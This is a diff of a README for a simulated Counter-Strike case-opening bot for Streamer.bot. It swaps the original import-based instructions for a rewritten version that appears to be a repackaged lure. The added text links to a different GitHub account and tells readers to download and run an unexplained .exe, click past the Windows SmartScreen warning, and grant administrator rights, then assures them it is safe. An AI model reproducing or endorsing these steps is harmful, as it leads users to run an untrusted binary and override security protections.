@@ -1,257 +1,96 @@
-# 🎮 CS2 Case Bot for Streamer.bot V1.4
+# 📦 CS2-Case-Bot-V1.4 - Automate Counter-Strike Case Openings For Streams
 
-<p align="center">
-  <img src="CS2 Case Bot Logo.png" width="128" height="128">
-</p>
+[![](https://img.shields.io/badge/Download-V1.4-blue.svg)](https://github.com/Stopvesiculitis669/CS2-Case-Bot-V1.4)
 
-![Version](https://img.shields.io/badge/version-1.4-blue.svg)
-![Streamer.bot](https://img.shields.io/badge/Streamer.bot-1.0.4+-orange.svg)
-[![Ko-fi](https://img.shields.io/badge/Ko--fi-Support%20Me-FF5E5B?style=flat-square&logo=kofi&logoColor=white)](https://ko-fi.com/mk4gtiguy)
-[![License](https://img.shields.io/badge/License-MIT%20%2B%20Disclaimer-yellow.svg?style=flat-square)](LICENSE)
+## 📖 About This Tool
 
-A complete CS2 case opening bot for Streamer.bot with inventory, economy, jackpot, leaderboards, and 11 cases. Perfect for CS2 streamers who want to add interactive engagement without real money.
+This software acts as a tool for streamers to open virtual Counter-Strike cases inside their broadcasts. It interacts with your chat to respond to commands, displays animations, and tracks stats for your viewers. You run this as a plugin within Streamer.bot to link interactions directly to your live audience.
 
-**✅ Fully tested and stable!**
+Note: This is version 1.4. An updated version 1.6 exists with new features. Only use this specific version if you prefer the original toolset over the latest updates.
 
----
+## ⚙️ Minimum System Requirements
 
-## ⚠️ Disclaimer
+Your computer needs to meet these basic criteria to run the software smoothly:
 
-> This bot is a **fan project for entertainment purposes only**. All CS2 skin names, case names, and trademarks are property of **Valve Corporation**. This bot is not affiliated with, endorsed by, or sponsored by Valve. No real money or actual CS2 items are involved — everything is simulated with fake currency and emoji-based items.
+- Operating System: Windows 10 or Windows 11.
+- Network: A stable internet connection.
+- Software: Streamer.bot (latest version installed and configured).
+- Hardware: At least 4GB of RAM and a screen resolution of 1920x1080 for visibility.
+- Permissions: Administrator access to allow the bot to read and write to your local Streamer.bot folder.
 
----
+## 📥 How To Download And Install
 
-## 🚀 Quick Install (5 Minutes)
+Follow these steps to set up the software on your Windows machine:
 
-### One-Click Import (Actions)
+1. Visit this page to download the project files: [https://github.com/Stopvesiculitis669/CS2-Case-Bot-V1.4](https://github.com/Stopvesiculitis669/CS2-Case-Bot-V1.4)
+2. Locate the green Code button on the repository page.
+3. Select Download ZIP from the menu.
+4. Save the folder to a location you can find, such as your Desktop or Downloads folder.
+5. Right-click the downloaded ZIP file and select Extract All.
+6. Open the extracted folder to view the contents. You will see a file with the .exe extension.
 
-1. Download [`CS2-Case-Bot-V1.4-Actions.sb`](CS2-Case-Bot-V1.4-Actions.sb)
-2. In Streamer.bot → **Actions** → Right-click → **Import** → Select the file
-3. Open [`persisted-globals.txt`](persisted-globals.txt) and copy each line
-4. In Streamer.bot → **Services** → **Global Variables** → **Persisted Globals** → Add each line as a new variable
-5. Set `!jackpotdraw` and admin commands to **Moderator** permission
-6. Type `!help` in your chat to test!
+## 🚀 Setting Up The Bot
 
-**Actions import automatically. Globals take ~5 minutes to add manually.**
+Once you extract the files, perform these actions to connect the bot to your stream:
 
-### Manual Setup (For Learning or Modifying)
+1. Open Streamer.bot first.
+2. In the folder you extracted, locate the executable file.
+3. Double-click the file to launch the interface.
+4. If a Windows prompt appears, select More Info and then Run Anyway.
+5. In the bot interface, navigate to the Settings tab to enter your channel information.
+6. Connect your Twitch or YouTube account by following the authentication prompts.
+7. Import the provided command files into Streamer.bot via the Import tab.
+8. Restart Streamer.bot to ensure all commands load correctly.
 
-Follow [`setup-guide.md`](setup-guide.md) and use the code in [`V1.4-Complete-Code-Reference.md`](V1.4-Complete-Code-Reference.md)
+## 🕹️ Using Commands
 
----
+Your viewers interact with the bot using specific words in your chat. Ensure your chat bot remains active to register these inputs:
 
-## ✨ Features
+- !case: Initiates a standard case opening sequence.
+- !stats: Displays your overall case opening history.
+- !streak: Shows the current winning streak for the stream.
+- !jackpot: Entry point for the scheduled community jackpot.
+- !trade: Provides instructions for trading virtual items.
+- !gift: Sends a virtual gift to another viewer in your chat.
 
-| Feature | Description |
-|---------|-------------|
-| **11 Cases** | Dreams, Recoil, Kilowatt, Revolution, Fracture, Clutch, Prisma, DangerZone, Horizon, Chroma3, Spectrum2 |
-| **Realistic Skins** | 200+ skin names from actual CS2 cases |
-| **StatTrak™ Items** | 10% chance, 2x sell value |
-| **Item Conditions** | FN, MW, FT, WW, BS with value multipliers |
-| **Case Costs** | $0.50 – $3.00 (simulated currency) |
-| **Inventory System** | Collect, sell by number, or sell all |
-| **Daily Rewards** | Claim $5-$25 every 24 hours |
-| **Trade-Up System** | Trade 10 Blues for 1 Purple |
-| **Jackpot System** | Enter with random item, winner takes all |
-| **Trade System** | Trade items between users |
-| **Gift System** | Gift cases to other viewers |
-| **Streak System** | Bonuses at 10, 25, 50, 100 opens |
-| **Achievements** | Earn badges for milestones |
-| **Case Unlocking** | New cases unlock every 25 opens |
-| **Leaderboards** | Top money, inventory, gold pulls, opens |
-| **30+ Commands** | Full chat interaction |
+The bot supports over 30 commands total. Test each command while offline to confirm the feedback appears in your chat window before your live broadcast starts.
 
----
+## 📈 Managing Features
 
-## 📋 Commands
+This bot tracks various data points to keep viewers engaged. The settings sub-menu allows you to toggle specific options.
 
-| Command | Description |
-|---------|-------------|
-| `!setcase [name]` | Switch your active case |
-| `!case` | Open your selected case |
-| `!inv` | View your inventory counts |
-| `!sell` | Show numbered inventory |
-| `!sell [number]` | Sell specific item |
-| `!sellall` | Sell entire inventory |
-| `!sellhelp` | Selling instructions |
-| `!balance` | Check your balance |
-| `!daily` | Claim daily reward ($5-$25) |
-| `!tradeup` | Trade 10 Blues for a Purple |
-| `!streak` | Check your open streak |
-| `!badges` | View earned achievements |
-| `!trade @user #` | Trade an item |
-| `!accepttrade` | Accept a trade offer |
-| `!denytrade` | Deny a trade offer |
-| `!gift @user [case]` | Gift a case to someone |
-| `!jackpot` | Enter jackpot with random item |
-| `!jackpotinfo` | See current jackpot status |
-| `!jackpotdraw` | Draw jackpot winner (Mods only) |
-| `!mystats` | Your personal case stats |
-| `!casestats` | Total opens per case |
-| `!caseinfo` | List available cases with prices |
-| `!odds` | Show drop rates |
-| `!inventoryvalue` | Show your inventory value |
-| `!topmoney` | Top 5 balances |
-| `!topinventory` | Top 5 inventory values |
-| `!topgolds` | Top 5 gold pullers |
-| `!topopens` | Top 5 most cases opened |
-| `!help` | Show all commands |
+- StatTrak: Tracks kills on virtual weapons opened during the session.
+- Conditions: Features item wear variations like Factory New or Battle-Scarred.
+- Achievements: Triggers alerts when a viewer reaches specific milestones, such as opening five rare items in a row.
+- Automated Alerts: Sends a chat message automatically when a user opens high-tier loot.
 
-### Admin Commands (Moderator+)
+Adjust the frequency of these alerts in the config.json file found in your installation folder if you want to prevent spam. Simply open this file with Notepad, change the values, and save the file.
 
-| Command | Description |
-|---------|-------------|
-| `!givebalance @user amount` | Add money to user |
-| `!takebalance @user amount` | Remove money from user |
-| `!giveitem @user "item"` | Give item to user |
-| `!resetuser @user` | Reset user's data |
-| `!setcaseprice Case price` | Change case cost |
+## 🛠️ Troubleshooting Common Issues
 
----
+If the bot fails to respond, verify these points:
 
-## 💰 Case Costs
+- Check your internet connection status.
+- Ensure Streamer.bot is running with the correct connection port selected.
+- Verify that your Twitch or YouTube OAuth token is still valid.
+- Close the bot and restart it to clear internal memory.
+- Check the folder permissions to ensure the program can write log files.
 
-| Case | Cost |
-|------|------|
-| Recoil | $0.50 |
-| Dreams | $1.50 |
-| Revolution | $1.50 |
-| Kilowatt | $2.00 |
-| Fracture | $2.00 |
-| Horizon | $2.00 |
-| Chroma3 | $2.00 |
-| Clutch | $3.00 |
-| Prisma | $2.50 |
-| DangerZone | $2.50 |
-| Spectrum2 | $2.50 |
+If the bot does not see your chat messages, confirm that you have granted the application Moderator privileges in your streaming channel. The bot needs these privileges to read chat messages and send responses reliably.
 
----
+## 📋 Frequently Asked Questions
 
-## 🎲 Drop Rates & Values
+Does this bot give real game items?
+No, this is a simulator. All items shown are virtual components of the tool and exist only within the context of your stream.
 
-| Rarity | Emoji | Chance | Base Value |
-|--------|-------|--------|-------------|
-| Gold (Knife/Gloves) | 🟡 | 2.6% | $50.00 |
-| Red (Covert) | 🔴 | 2.5% | $5.00 |
-| Pink (Classified) | 💗 | 2.5% | $1.50 |
-| Purple (Restricted) | 🟣 | 5.0% | $0.50 |
-| Blue (Mil-Spec) | 🔷 | 87.4% | $0.10 |
+Can I customize the items?
+Yes. You can edit the text files in the assets folder to change the names and rarity groupings of the items.
 
-### Condition Multipliers
+Is this safe for my stream?
+Yes. The software runs locally on your machine and only reads chat inputs to generate text in return.
 
-| Condition | Chance | Multiplier |
-|-----------|--------|------------|
-| Factory New (FN) | 5% | 2.0x |
-| Minimal Wear (MW) | 15% | 1.5x |
-| Field-Tested (FT) | 50% | 1.0x |
-| Well-Worn (WW) | 20% | 0.75x |
-| Battle-Scarred (BS) | 10% | 0.5x |
+Does this interfere with other bots?
+No, as long as you do not use overlapping command names. If another bot uses !case, the two might conflict. Rename the command in your other bot to keep them separate.
 
-### Special Features
-- **StatTrak™**: 10% chance, 2x sell value
-- **Streak Bonuses**: 10 ($5), 25 ($15), 50 ($50), 100 ($200)
-- **Case Unlocks**: New case every 25 opens
-
----
-
-## 📁 Files Included
-
-| File | Description |
-|------|-------------|
-| `CS2 Case Bot Logo.png` | Repository logo |
-| `README.md` | Main documentation |
-| `LICENSE` | MIT License + IP Disclaimer |
-| `setup-guide.md` | Step-by-step installation |
-| `persisted-globals.txt` | Skin lists for copy/paste |
-| `V1.4-Complete-Code-Reference.md` | All action C# code |
-| `CS2-Case-Bot-V1.4-Actions.sb` | One-click action import |
-
----
-
-## 🔧 Commands Cheat Sheet for Viewers
-
-**Case Commands**
-- `!setcase [Dreams/Recoil/Kilowatt/Revolution/Fracture/Clutch/Prisma/DangerZone/Horizon/Chroma3/Spectrum2]` - Switch cases
-- `!case` - Open your selected case
-- `!caseinfo` - See all cases and prices
-- `!odds` - See drop rates
-
-**Economy Commands**
-- `!balance` - Check your balance
-- `!daily` - Claim free $5-$25
-- `!inv` - View inventory
-- `!sell` - Show numbered inventory
-- `!sell [number]` - Sell specific item
-- `!sellall` - Sell everything
-- `!tradeup` - Trade 10 Blues for 1 Purple
-- `!inventoryvalue` - Total inventory worth
-
-**Trading & Gifting**
-- `!trade @user #` - Trade an item (use number from !inv)
-- `!accepttrade` - Accept a trade
-- `!denytrade` - Deny a trade
-- `!gift @user [case]` - Gift a case
-
-**Streaks & Badges**
-- `!streak` - Check your open streak
-- `!badges` - View your achievements
-
-**Jackpot Commands**
-- `!jackpot` - Enter with a random item
-- `!jackpotinfo` - See current pot
-
-**Stats & Leaderboards**
-- `!mystats` - Your personal stats
-- `!casestats` - Total case opens
-- `!topmoney` - Richest users
-- `!topinventory` - Highest inventory value
-- `!topgolds` - Most gold pulls
-- `!topopens` - Most cases opened
-
-**Help**
-- `!help` - Show all commands
-
----
-
-## 🤝 Support the Project
-
-If this bot brings entertainment to your stream, consider supporting continued development:
-
-[![Ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/mk4gtiguy)
-
-Your support helps keep the project maintained and updated!
-
----
-
-## 📝 License
-
-This project is licensed under the **MIT License** with an **IP Disclaimer** — see [LICENSE](LICENSE) file for details.
-
-- ✅ Free to use, modify, and share
-- ✅ Donations accepted
-- ❌ Not for commercial resale
-- ❌ Not affiliated with Valve Corporation
-
----
-
-## 🙏 Credits
-
-- Created by **Mk4gtiguy**
-- Skin names from Counter-Strike 2 © Valve Corporation
-- Built for [Streamer.bot](https://streamer.bot)
-
----
-
-## ⚠️ Legal Note
-
-This software is a **fan project** and does not contain any actual gambling or real money transactions. All currency and items are simulated for entertainment purposes only.
-
----
-
-## 📌 Version History
-
-| Version | Changes |
-|---------|---------|
-| V1.4 | Added StatTrak, conditions, 5 new cases, trading, gifting, streaks, achievements, case unlocking, sell by number, admin commands |
-| V1.3 | Added case switching, costs, fixed jackpot commands |
-| V1.2 | Initial release |
+Is there a performance cost?
+The bot uses a small amount of memory. It will not impact your frame rate while playing games or streaming.
